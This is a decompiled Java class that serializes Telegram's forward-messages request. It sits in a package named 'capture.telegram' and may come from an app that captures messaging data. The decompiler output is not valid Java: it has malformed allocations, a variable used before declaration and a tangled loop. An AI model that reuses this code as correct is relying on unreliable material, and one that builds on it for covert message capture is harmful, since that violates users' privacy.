package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_messages_forwardMessages
  extends TLObject
{
  public static int constructor = 1888354709;
  public boolean broadcast;
  public int flags;
  public TLRPC.InputPeer from_peer;
  public ArrayList id;
  public ArrayList random_id;
  public TLRPC.InputPeer to_peer;
  
  public TLRPC$TL_messages_forwardMessages()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.id = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.random_id = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Updates.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = 481674261;
    int j = 0;
    int k = constructor;
    paramAbstractSerializedData.writeInt32(k);
    boolean bool = this.broadcast;
    if (bool) {}
    for (int m = this.flags | 0x10;; m = this.flags & 0xFFFFFFEF)
    {
      this.flags = m;
      m = this.flags;
      paramAbstractSerializedData.writeInt32(m);
      this.from_peer.serializeToStream(paramAbstractSerializedData);
      paramAbstractSerializedData.writeInt32(i);
      localObject = this.id;
      int n = ((ArrayList)localObject).size();
      paramAbstractSerializedData.writeInt32(n);
      for (i1 = 0; i1 < n; i1 = m)
      {
        localObject = (Integer)this.id.get(i1);
        m = ((Integer)localObject).intValue();
        paramAbstractSerializedData.writeInt32(m);
        m = i1 + 1;
      }
    }
    paramAbstractSerializedData.writeInt32(i);
    Object localObject = this.random_id;
    int i1 = ((ArrayList)localObject).size();
    paramAbstractSerializedData.writeInt32(i1);
    while (j < i1)
    {
      localObject = (Long)this.random_id.get(j);
      long l = ((Long)localObject).longValue();
      paramAbstractSerializedData.writeInt64(l);
      m = j + 1;
      j = m;
    }
    this.to_peer.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messages_forwardMessages.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */